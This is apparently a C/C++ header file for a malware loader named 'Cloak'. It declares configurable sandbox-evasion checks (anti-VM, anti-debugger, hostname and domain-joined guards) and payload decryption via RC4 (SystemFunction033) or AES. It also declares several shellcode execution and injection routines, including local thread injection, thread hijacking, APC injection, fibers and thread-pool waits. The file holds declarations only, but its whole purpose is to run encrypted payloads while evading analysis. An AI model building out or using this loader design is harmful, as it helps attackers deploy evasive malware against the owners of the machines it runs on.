#pragma once

#ifndef CLOAK_H
#define CLOAK_H

#include "Config.hpp"
#include "Cloak.hpp"

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

int CloakMain(PVOID Reserved);

#ifdef DLL
#define DLLEXPORT __declspec( dllexport )
#endif // !DLL

#ifdef CHECK_HOSTNAME
BOOL CheckHostname(IN LPSTR pwGuardHost);
#endif // !CHECK_HOSTNAME

#ifdef CHECK_DOMAIN_JOINED
BOOL CheckDomainJoined();
#endif // !CHECK_DOMAIN_JOINED

#ifdef ANTI_VM
// return TRUE if in VM
BOOL IsVm();
#endif // !ANTI_VM

#ifdef ANTI_DEBUG
BOOL IsDebugger();
#endif // !ANTI_DEBUG

#ifdef AES
#include "aes.h"
#endif // !AES

#ifdef RC4
typedef struct
{
	DWORD	Length;
	DWORD	MaxLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	USTRING* Data,
	USTRING* Key
);

#endif // !RC4

#ifdef LOCAL_THREAD
BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !LOCAL_THREAD

#ifdef LOCAL_THREAD_HIJACK
BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
VOID GottaCatchEmAll(); // useless function
#endif // !LOCAL_THREAD_HIJACK

#ifdef LOCAL_THREAD_HIJACK_ENUM
BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif //! LOCAL_THREAD_HIJACK_ENUM

#ifdef APC_INJECT
VOID WaitForSingleObjectExAlertable();
BOOL ApcInjection(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !APC_INJECT

#ifdef FIBERS
BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !FIBERS

#ifdef THREADPOOLWAIT
#include <threadpoolapiset.h>
BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !THREADPOOLWAIT

#endif // !CLOAK_H